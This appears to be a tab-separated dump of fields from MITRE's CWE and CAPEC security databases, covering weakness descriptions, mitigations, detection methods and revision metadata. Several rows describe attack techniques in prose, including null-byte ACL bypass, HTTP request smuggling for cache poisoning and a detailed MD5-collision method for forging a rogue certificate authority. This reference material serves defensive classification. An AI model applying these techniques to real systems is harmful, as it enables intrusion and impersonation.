21062	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
23067	62	updated Relationships, Taxonomy_Mappings
7901	85	167
24955	24	MITRE
14085	62	updated Common_Consequences
24821	62	updated Demonstrative_Examples, References, Relationships
20665	35	Cigital
23185	21	PLOVER
5835	62	updated Applicable_Platforms, Description, Maintenance_Notes, Other_Notes, Potential_Mitigations, Relationships
11237	26	Architecture and Design
5820	69	Incomplete
19859	100	The MITRE Corporation
17829	51	2014-06-23
9470	69	Incomplete
8778	62	updated Common_Consequences, Relationships
21713	73	Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.
20912	62	updated Relationships
22417	28	CWE Content Team
16286	21	PLOVER
13832	39	2008-08-01
16376	51	2014-06-23
16221	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22566	35	MITRE
10858	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component.
15027	89	Meta
13992	54	Medium
23578	91	Implementation
14656	35	MITRE
10186	46	All implementations of clone() should obtain the new object by calling super.clone(). If a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.
9503	73	Adversary uses Web advertisements to attract the victim to access adversary's DNS. Explore the versions of web browser or flash players in HTTP request.
18338	76	2017-05-01
15518	35	MITRE
15856	67	Low
9445	39	2011-03-29
17079	42	Debugging information should not make its way into a production release.
10697	26	Architecture and Design
9719	28	CWE Content Team
5604	35	MITRE
24824	59	Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
17709	63	Read Files or Directories
15527	35	MITRE
24658	101	CAPEC Content Team
18540	28	CWE Content Team
12148	54	Low
10496	73	Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.
24773	39	2009-07-27
10218	59	Updated Alternate_Terms, Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Other_Notes, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
12160	78	Medium
11524	42	Use vigorous whitelist style checking on any user input that may be used in a SQL command. Rather than escape meta-characters, it is safest to disallow them entirely. Reason: Later use of data that have been entered in the database may neglect to escape meta-characters before use. Narrowly define the set of safe characters based on the expected value of the parameter in the request.
25262	62	updated Related_Attack_Patterns
11721	104	46
10078	35	MITRE
14902	80	Crafting the proper malicious site and luring the victim to this site is not a trivial task.
9016	35	MITRE
20253	28	CWE Content Team
7372	39	2008-07-01
23538	21	7 Pernicious Kingdoms
24780	57	Indirect
6485	26	Implementation
6801	91	Implementation
16583	80	Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.
14722	62	updated Relationships
9468	28	CWE Content Team
15341	66	Setting a crossdomain.xml file for HTTP streaming
17293	97	Content Spoofing Via Application API Manipulation
16967	66	The Protection of Information in Computer Systems
8227	28	CWE Content Team
8007	91	Architecture and Design
7266	88	Sensitive Cookie Without 'HttpOnly' Flag
24445	92	Explore
17678	35	MITRE
24661	102	ChildOf
13294	77	Automated Static Analysis
24161	21	CWE Content Team
16258	101	CAPEC Content Team
5626	35	MITRE
17541	27	The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
18688	95	[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.
11103	101	CAPEC Content Team
9728	56	ChildOf
16526	96	2011-03-24
15626	61	Draft
16667	62	updated Potential_Mitigations, Time_of_Introduction
15171	56	ChildOf
25296	35	MITRE
11605	26	Architecture and Design
9909	69	Incomplete
16973	61	Stable
23648	44	High
8213	103	Primary
22607	103	Primary
7690	50	HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.
25209	28	CWE Content Team
19076	35	MITRE
18712	100	The MITRE Corporation
16319	28	CWE Content Team
15199	73	Use a proxy tool to record results of manual input of XSS probes in known URLs.
9688	28	CWE Content Team
22930	28	CWE Content Team
22365	62	updated Relationships
23837	76	2017-08-04
11146	35	MITRE
18915	103	Primary
16725	31	699
20401	63	Execute Unauthorized Code or Commands
14801	81	Integrity
25407	62	updated Other_Notes, Weakness_Ordinalities
7185	28	CWE Content Team
20437	31	1000
9365	63	Unexpected State
7510	47	Unreliable Execution
19007	62	updated Common_Consequences
12296	89	Standard
8377	35	MITRE
14787	47	Bypass Protection Mechanism
21422	32	SPiRE Security
22067	62	updated References, Relationships
12365	81	Confidentiality
10440	69	Draft
10144	50	Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries.
18951	50	Design: Minimize switch and option functionality to only that necessary for correct function of the command.
24277	91	Testing
14021	21	PLOVER
8091	28	Eric Dalci
16357	31	699
18336	76	2015-11-09
15970	81	Availability
15060	28	CWE Content Team
7534	39	2012-05-11
20994	35	MITRE
9683	73	Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.
11560	39	2009-05-27
17042	81	Integrity
12756	56	ChildOf
12045	74	1
6347	28	CWE Content Team
11492	55	CAPEC Content Team
10268	62	updated Common_Consequences
16849	39	2008-07-01
10515	39	2017-11-08
13594	80	To discover a specific vulnerability, attacker needs to reverse engineer signature parsing, signature verification and signer representation code.
7881	28	Eric Dalci
9399	28	CWE Content Team
23343	28	Eric Dalci
25212	53	The MITRE Corporation
24221	39	2011-03-29
16208	101	CAPEC Content Team
22005	39	2011-06-01
7354	62	updated Related_Attack_Patterns
15493	28	CWE Content Team
24068	30	team teso
14450	35	MITRE
8665	35	MITRE
13541	101	CAPEC Content Team
20269	39	2011-06-27
15124	63	Modify Files or Directories
5684	56	ChildOf
12135	56	ChildOf
6769	56	ChildOf
20956	47	Gain Privileges
19451	53	The MITRE Corporation
15894	28	Eric Dalci
17194	62	updated Related_Attack_Patterns
13147	28	Eric Dalci
13216	28	CWE Content Team
20481	39	2008-08-01
19572	28	CWE Content Team
12456	21	CWE Content Team
16237	28	CWE Content Team
14026	49	2006
16868	79	Access Control
15183	100	The MITRE Corporation
19853	55	CAPEC Content Team
8219	23	The software does not properly handle the characters that are used to mark the beginning and ending of a group of entities, such as parentheses, brackets, and braces.
10464	35	MITRE
13900	39	2011-06-27
19152	61	Stable
22902	92	Experiment
21148	102	ChildOf
24179	28	CWE Content Team
21590	90	C#
6331	39	2008-07-01
16370	104	446
22555	39	2017-11-08
10985	28	CWE Content Team
9928	35	MITRE
10085	69	Incomplete
5926	66	A Taxonomy of Security Faults in the UNIX Operating System
20022	100	The MITRE Corporation
18811	27	None: No specialized resources are required to execute this type of attack. The ability to access the target is required.
7968	42	Implement proper protection for immutable data (e.g. environment variable, hidden form fields, etc.)
17505	28	CWE Content Team
21522	42	Use unpredictable names or identifiers for the locks. This might not always be possible or feasible.
19199	35	Cigital
9521	100	The MITRE Corporation
13249	56	PeerOf
22287	79	Integrity
7865	28	CWE Content Team
13150	81	Confidentiality
12541	42	define a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors.
19544	77	Manual Static Analysis - Source Code
18814	62	updated Potential_Mitigations
11127	40	The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.
23793	23	The software receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.
22231	81	Authorization
14986	52	The external control or influence of filenames can often be detected using automated static analysis that models data flow within the software.                   Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. If the program uses a customized input validation library, then some tools may allow the analyst to create custom signatures to detect usage of those routines.
9430	56	PeerOf
12827	35	MITRE
10484	35	MITRE
8995	78	High
7594	62	updated Background_Details, Other_Notes
14526	28	CWE Content Team
8491	28	CWE Content Team
11956	45	Class
16940	28	CWE Content Team
11258	95	Monitor the behavior of the system to see if it goes into an insecure/inconsistent state.
5682	53	The MITRE Corporation
8167	62	updated Time_of_Introduction
6201	92	Explore
25123	97	Removal of filters: Input filters, output filters, data masking
22652	28	CWE Content Team
22313	39	2011-06-01
24018	62	updated Common_Consequences
18104	76	2017-01-09
18534	28	CWE Content Team
12783	31	699
10167	100	The MITRE Corporation
20915	102	ChildOf
8931	103	Primary
20228	51	2014-06-23
24241	102	CanPrecede
15524	81	Integrity
23154	54	High
9332	39	2014-07-30
25414	95	[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.
11491	39	2011-06-27
16872	81	Confidentiality
10746	62	updated Common_Consequences
10257	93	Moderate
9152	39	2010-02-16
8075	86	http://www.w3.org/Security/Faq/wwwsf4.html
10499	59	Updated Related_Weaknesses
21801	28	Sean Eidemiller
17289	28	CWE Content Team
18868	61	Draft
16278	39	2014-07-30
11957	103	Primary
10753	23	The software does not properly maintain a reference to a resource that has been allocated, which prevents the resource from being reclaimed.
11338	79	Integrity
14937	39	2008-10-14
12785	91	Implementation
18526	39	2011-06-01
7660	33	Matt Bishop
25215	80	Intelligence about the manufacturer's operating environment and infrastructure.
11327	35	MITRE
13826	35	Cigital
17705	62	updated Related_Attack_Patterns
19634	31	1000
10290	26	Implementation
6022	101	CAPEC Content Team
13231	51	2014-06-23
16527	36	https://samate.nist.gov/SRD/view_testcase.php?tID=1579
19609	28	CWE Content Team
20386	39	2017-11-08
11127	85	577
21958	28	CWE Content Team
22312	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
25047	62	updated Relationships
20379	104	586
6994	62	updated Relationships, Taxonomy_Mappings
12369	39	2014-02-18
21227	102	ChildOf
24794	28	CWE Content Team
8992	101	CAPEC Content Team
23612	63	Quality Degradation
14454	88	Information Exposure Through Source Code
24074	28	CWE Content Team
10590	89	Meta
6827	76	2015-12-07
13027	39	2017-11-08
18018	45	Base
19665	88	Class with Virtual Method without a Virtual Destructor
12900	28	CWE Content Team
22161	61	Draft
17248	35	MITRE
16834	39	2008-07-01
7928	63	Unexpected State
22489	79	Confidentiality
20362	62	updated Related_Attack_Patterns
10690	69	Draft
24840	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.                   For example, ID 1 could map to "/login.asp" and ID 2 could map to "http://www.example.com/". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.
21376	62	updated Background_Details, Relationships, Other_Notes, Taxonomy_Mappings
6123	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before inserting the input into an executable resource, such as a library, configuration file, or template.
17081	28	CWE Content Team
12933	70	Wikipedia
16601	62	updated Taxonomy_Mappings
23037	69	Incomplete
6874	47	Execute Unauthorized Commands
12265	39	2019-06-20
8408	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Modes_of_Introduction, Observed_Examples, Relationships
8452	39	2014-02-18
15414	53	The MITRE Corporation
11609	39	2017-11-08
6875	56	ChildOf
21109	90	Language-Independent
11487	72	A successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible.
19937	50	Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).
23055	73	Use a proxy tool to record all links visited during a manual traversal of the web application.
9418	59	Updated Related_Attack_Patterns
25013	31	1000
9900	39	2017-11-08
23406	23	The code contains a data element with a pointer that does not have an associated copy or constructor method.
12705	100	The MITRE Corporation
24450	78	Medium
22072	60	18
20157	28	CWE Content Team
22382	60	26
23659	35	MITRE
10619	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
11449	96	2009-12-04
24610	26	Implementation
19650	69	Incomplete
12767	104	335
22066	39	2010-12-13
14987	39	2012-05-11
21479	62	updated Demonstrative_Examples, Relationships
18439	93	Defense in Depth
13348	39	2010-02-16
25054	88	EJB Bad Practices: Use of AWT Swing
11153	90	Language-Independent
23440	39	2011-06-01
20283	103	Primary
20522	39	2008-07-01
8455	62	updated Common_Consequences
13714	62	updated Demonstrative_Examples, Detection_Factors
19251	100	The MITRE Corporation
13676	100	The MITRE Corporation
19499	62	updated Relationships
14631	39	2012-10-30
16494	62	updated References, Relationships
19432	62	updated Potential_Mitigations
20705	94	The attacker's goal is to prevent users from accessing the wireless network. Denying connectivity to the wireless network prevents the user from being able to transmit or receive any data, which also prevents VOIP calls, however this attack poses no threat to data confidentiality.
15298	54	Medium
16123	79	Availability
11642	104	1058
25051	35	MITRE
8173	35	Cigital
5748	39	2019-01-03
8293	35	Cigital
22948	71	2010
10040	28	CWE Content Team
9586	46	Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of an application or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.
10921	66	Building Secure Software: How to Avoid Security Problems the Right Way
24133	104	353
21236	81	Other
24560	23	The software contains a serializable data element that does not      have an associated serialization method.
10980	100	The MITRE Corporation
9371	28	CWE Content Team
12632	91	Implementation
24681	35	MITRE
18573	23	An interaction error occurs when two entities have correct behavior when running independently of each other, but when they are integrated as components in a larger system or process, they introduce incorrect behaviors that may cause resultant weaknesses.
20098	35	MITRE
18791	39	2011-09-13
6954	84	28
5777	39	2019-06-20
22714	39	2013-02-21
19028	92	Exploit
9382	55	CAPEC Content Team
24061	28	CWE Content Team
6730	28	CWE Content Team
19421	93	None
12183	26	Operation
15562	50	When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.
24740	28	CWE Content Team
16871	100	The MITRE Corporation
23709	62	updated Relationships
21838	39	2008-09-08
24768	62	updated Potential_Mitigations
21970	31	1000
22598	35	MITRE
18779	90	Language-Independent
17702	88	Incorrect Behavior Order
22679	62	updated Applicable_Platforms
22401	28	Eric Dalci
18539	35	MITRE
11018	69	Incomplete
22369	39	2008-07-01
15571	35	MITRE
10382	95	[Attempt to inject a remote flash file] The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.
12818	22	05
8827	63	Varies by Context
10329	35	MITRE
22716	28	CWE Content Team
17069	79	Integrity
7957	62	updated Related_Attack_Patterns
16607	81	Other
13904	31	699
25395	91	Implementation
12184	89	Standard
18901	28	CWE Content Team
6194	31	1000
15099	39	2018-03-27
9515	103	Primary
6047	42	Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default.
8291	63	Gain Privileges or Assume Identity
13955	35	MITRE
7332	22	02
14785	39	2014-06-23
15076	56	ChildOf
17884	22	12
7578	50	For competing actions, use well-known libraries which implement synchronization.
15780	91	Testing
7134	62	updated Potential_Mitigations, Time_of_Introduction
12580	78	High
8076	28	CWE Content Team
24388	28	CWE Content Team
13119	62	updated Demonstrative_Examples, Description, Detection_Factors, Name, Potential_Mitigations, Relationships
21092	89	Detailed
14683	72	When a protection mechanism relies on random values to restrict access to a sensitive resource, such as a session ID or a seed for generating a cryptographic key, then the resource being protected could be accessed by guessing the ID or key.
17456	28	CWE Content Team
7664	78	High
6274	35	MITRE
20020	100	The MITRE Corporation
8985	73	Use a proxy tool to record the HTTP responses headers.
18143	69	Incomplete
24819	39	2012-05-11
7405	104	33
24427	50	Use secure functions not vulnerable to buffer overflow.
13628	63	Alter Execution Logic
13713	59	Updated Related_Attack_Patterns
23058	35	MITRE
14111	47	Execute Unauthorized Commands
18774	27	Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.
19338	35	MITRE
23027	88	Excessive McCabe Cyclomatic Complexity
9515	31	699
19335	62	updated Relationships
12033	28	CWE Content Team
21859	57	Indirect
24583	35	MITRE
19783	103	Primary
15647	79	Confidentiality
7023	23	The software incorrectly checks a return value from a function, which prevents the software from detecting errors or exceptional conditions.
13919	53	The MITRE Corporation
19060	63	Read Memory
19922	39	2010-04-05
17673	26	Implementation
8473	28	CWE Content Team
25313	39	2008-09-08
13673	69	Draft
11385	62	updated Common_Consequences
13658	77	Automated Static Analysis
8575	61	Draft
11209	73	Use a browser to manually explore the website and analyze how the application processes XML requests.
22536	97	Target Influence via Interview and Interrogation
10451	79	Authorization
21664	21	CWE Content Team
15371	55	CAPEC Content Team
24956	76	2018-07-31
22097	62	updated Potential_Mitigations, Time_of_Introduction
17676	69	Incomplete
9618	26	Architecture and Design
10093	28	CWE Content Team
17807	26	Architecture and Design
17872	63	DoS: Resource Consumption (CPU)
24389	23	The software does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.
23533	28	CWE Content Team
22687	39	2010-12-13
21698	42	Many contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.
9059	104	507
23583	39	2013-02-21
8138	39	2008-11-24
8653	49	2005
11458	62	updated Relationships
23974	47	Modify Data
23042	27	Access to a function to produce a hash (e.g., MD5, SHA1)                Tools that allow the attacker to intercept a message between the client and the server, specifically the hash that is the signature and the length of the original message concatenated with the secret bytes
17930	79	Confidentiality
14398	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
19814	35	MITRE
16924	28	CWE Content Team
21608	73	The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page
8406	50	Setup a session time out for the session IDs.
9465	31	699
21709	56	ChildOf
8408	28	CWE Content Team
17344	35	MITRE
21973	35	MITRE
14516	31	1000
9640	90	C#
19473	56	ChildOf
24449	43	Simple
8003	49	2010
24494	79	Authorization
11072	39	2008-09-08
11389	47	Other
13283	48	06
14273	77	Black Box
10859	39	2009-07-27
21998	92	Experiment
18058	39	2014-07-30
19397	39	2011-06-01
21254	28	CWE Content Team
22858	35	MITRE
11294	28	CWE Content Team
23756	39	2012-05-11
14248	76	2017-01-09
25293	50	Pay attention to concurrency problems related to the access of resources.
22740	73	Leverage the vulnerabilities identified in the Experiment Phase to inject malicious HTTP request that contains HTTP Request syntax that will be processed and acted on by the outer parsing layer of the cache server but not by the inner application layer. In this way it will be cached by the server without obvious sign from the application and the corrupt data will be served to future requesters.
15458	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
8889	56	ChildOf
18320	35	MITRE
23817	46	For example, a "." in SMTP signifies the end of mail message data, whereas a null character can be used for the end of a string.
21787	81	Other
8329	23	The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.
14826	56	ChildOf
24279	103	Primary
16368	39	2009-05-27
13573	79	Access Control
25275	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15275	72	Sensitive data may be exposed to attackers.
8478	62	updated Relationships
16167	28	CWE Content Team
6433	62	updated Potential_Mitigations
20722	62	updated Demonstrative_Examples
11171	52	This weakness is only detectable using white box methods (see black box detection factor). Careful analysis is required to determine if the code is likely to be removed by the compiler.
5909	39	2012-05-11
22136	56	ChildOf
6457	61	Stable
8244	62	updated Time_of_Introduction
14889	63	Bypass Protection Mechanism
21320	28	CWE Content Team
17147	67	High
9454	85	40
8012	28	CWE Content Team
11200	103	Primary
20780	73	Trick the victim to the malicious site through a cross-site scripting attack.
8983	62	updated Relationships
13819	28	CWE Content Team
22456	21	PLOVER
18866	81	Availability
7799	28	CWE Content Team
13628	81	Confidentiality
6932	63	Read Application Data
17705	35	MITRE
23880	35	MITRE
12429	48	07
19048	28	CWE Content Team
6187	72	An attacker could easily guess user passwords and gain access user accounts.
16904	79	Availability
20100	43	Simple
9384	35	MITRE
16151	89	Standard
5819	39	2013-07-17
15565	28	CWE Content Team
22917	81	Other
18435	91	Implementation
24121	35	MITRE
24781	39	2019-01-03
17219	33	Microsoft Corporation
16878	39	2010-12-13
6428	94	Privilege Escalation
20639	62	updated Applicable_Platforms
18553	78	Low
19423	39	2009-03-10
7730	100	The MITRE Corporation
12881	103	Primary
5614	62	updated Relationships
10632	28	CWE Content Team
13256	21	PLOVER
9344	28	CWE Content Team
6630	39	2010-12-13
17036	91	Architecture and Design
8083	40	The targeted site must not validate the hidden fields with backend processing.
20590	35	MITRE
12951	35	MITRE
24247	86	http://jeremiahgrossman.blogspot.com/2006/12/business-logic-flaws.html
7995	69	Incomplete
8773	62	updated Related_Attack_Patterns
17415	28	CWE Content Team
11733	76	2018-07-31
9504	91	Architecture and Design
18318	28	CWE Content Team
16251	89	Detailed
6260	42	For outbound authentication: store passwords outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible.
22781	62	updated Alternate_Terms
21717	39	2015-12-07
22210	35	MITRE
12171	35	MITRE
15407	21	PLOVER
7847	91	Implementation
18001	78	Low
17414	91	Implementation
9834	88	Use of a Broken or Risky Cryptographic Algorithm
15235	46	Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.
6246	28	CWE Content Team
8224	63	DoS: Crash, Exit, or Restart
14962	53	The MITRE Corporation
21022	62	updated Taxonomy_Mappings
7730	76	2019-04-04
9940	97	Cross Site Request Forgery
18662	79	Confidentiality
6434	101	CAPEC Content Team
23707	39	2008-10-14
16671	63	Read Application Data
7731	35	MITRE
11504	59	Updated Related_Weaknesses
11007	28	Eric Dalci
12970	39	2014-06-23
19359	28	CWE Content Team
18001	85	298
23788	28	CWE Content Team
8429	42	Refactor your code to avoid using reflection.
10302	101	CAPEC Content Team
15045	97	Use of Captured Tickets (Pass The Ticket)
6419	89	Standard
24266	62	updated Common_Consequences
18022	79	Integrity
20801	59	Updated Consequences
5935	101	CAPEC Content Team
18722	105	Web Based
10244	76	2017-08-04
18152	35	MITRE
11812	80	An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.
23633	35	MITRE
23861	35	MITRE
12539	23	An adversary exploits a weakness in the MD5 hash algorithm (weak collision resistance) to generate a certificate signing request (CSR) that contains collision blocks in the "to be signed" part. The adversary specially crafts two different, but valid X.509 certificates that when hashed with the MD5 algorithm would yield the same value. The adversary then sends the CSR for one of the certificates to the Certification Authority which uses the MD5 hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key. An adversary then takes that signed blob and inserts it into another X.509 certificate that the attacker generated. Due to the MD5 collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate. The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority. To make the attack more interesting, the second certificate could be not just a regular certificate, but rather itself a signing certificate. Thus the adversary is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Certification Authority that has signed the attackers' first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will now the Certificate Authority set up by the adversary and of course any certificates that it signs. So the adversary is now able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec).
7484	81	Availability
19740	35	MITRE
21138	81	Integrity
25165	81	Access Control
6697	43	Simple
8220	39	2008-10-14
10258	81	Integrity
17089	35	MITRE
12291	39	2011-03-29
23173	100	The MITRE Corporation
22873	91	Implementation
24815	103	Primary
12941	78	Low
6666	39	2010-06-21
6691	57	Resultant
20512	100	The MITRE Corporation
23238	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
13624	43	Simple
16610	35	MITRE
10699	79	Availability
15639	39	2017-11-08
23109	93	Defense in Depth
16610	39	2017-11-08
18991	39	2017-11-08
21399	28	CWE Content Team
19245	74	1
13565	43	Simple
24390	26	Implementation
24683	103	Primary
17312	69	Draft
19467	35	MITRE
13624	57	Resultant
21054	56	ChildOf
23527	72	Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
10401	35	MITRE
24450	40	Any target that services requests is vulnerable to this attack on some level of scale.
7742	91	Implementation
10781	56	ChildOf
17375	39	2008-07-01
6244	33	OWASP
11052	103	Primary
17928	23	The application stores a non-serializable object as an HttpSession attribute, which can hurt reliability.
7646	39	2009-03-10
7227	24	MITRE
15240	28	CWE Content Team
10658	62	updated Relationships
14452	80	Able to develop and manufacture malicious system components that resemble legitimate name-brand components.
17156	62	updated Applicable_Platforms
14134	31	699
14140	95	[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.
8063	45	Base
22026	39	2017-11-08
6657	56	ChildOf
9238	45	Base
9059	23	The software appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.
21787	63	Unexpected State
19585	69	Incomplete
10321	92	Explore
13915	90	Language-Independent
25437	91	Architecture and Design
13634	62	updated Demonstrative_Examples
18971	28	CWE Content Team
25376	56	PeerOf
5720	35	MITRE
19192	33	OWASP
9735	39	2008-07-01
5869	62	updated Relationships, Taxonomy_Mappings
19140	92	Experiment
14384	79	Authorization
22590	28	CWE Content Team
15830	100	The MITRE Corporation
7660	49	1995
9447	39	2009-01-12
12262	102	ChildOf
12949	39	2009-05-27
12713	88	Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
24621	35	MITRE
8639	35	MITRE
24401	49	2012
15480	31	1000
17386	39	2012-10-30
20727	102	ChildOf
6309	39	2012-10-30
21884	39	2008-07-01
14133	24	MITRE
7587	24	MITRE
11666	43	Simple
9529	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
13509	63	Hide Activities
15704	35	MITRE
18861	62	updated Description, Name
12676	31	1000
23636	86	http://web.archive.org/web/20060115174629/http://security.tombom.co.uk/shatter.html
17466	97	Magnetic Strip Card Brute Force Attacks
15352	26	Architecture and Design
16613	57	Indirect
21198	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12948	47	Resource Consumption
10355	62	updated Common_Consequences, Description, Other_Notes
7743	39	2019-01-03
20445	28	Eric Dalci
22698	28	CWE Content Team
20528	81	Authentication
19586	72	An attacker could utilize the untrusted data source to bypass protection mechanisms and gain access to sensitive data.
19566	53	The MITRE Corporation
17368	91	Operation
20608	62	updated Potential_Mitigations, References
11300	28	CWE Content Team
8560	42	Consider seriously the security implications of using an obsolete function. Consider using alternate functions.
10715	40	The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.
17021	91	Implementation
12681	96	2018-07-02
23571	39	2010-02-16
11399	43	Simple
14732	56	ChildOf
11730	35	Cigital
20580	28	CWE Content Team
11579	97	Absolute Path Traversal
15289	35	MITRE
22011	100	The MITRE Corporation
21543	35	MITRE
21434	28	CWE Content Team
18847	104	341
13684	62	updated Common_Consequences
24974	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
18886	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17125	46	Events are a messaging system which may provide control data to programs listening for events. Events often do not have any type of authentication framework to allow them to be verified from a trusted source. Any application, in Windows, on a given desktop can send a message to any window on the same desktop. There is no authentication framework for these messages. Therefore, any message can be used to manipulate any process on the desktop if the process does not check the validity and safeness of those messages.
13041	103	Primary
6915	103	Primary
5968	39	2010-12-13
9387	91	Implementation
14711	77	Dynamic Analysis with Manual Results Interpretation
15257	28	CWE Content Team
8907	28	CWE Content Team
19221	55	CAPEC Content Team
18954	73	If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash file is loaded.
16632	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and perform a login. Look for library functions and system calls that indicate when privileges are being raised or dropped. Look for accesses of resources that are restricted to normal users.
22962	67	Low
7301	28	Eric Dalci
9508	90	Language-Independent
15318	101	CAPEC Content Team
6044	28	CWE Content Team
13948	61	Draft
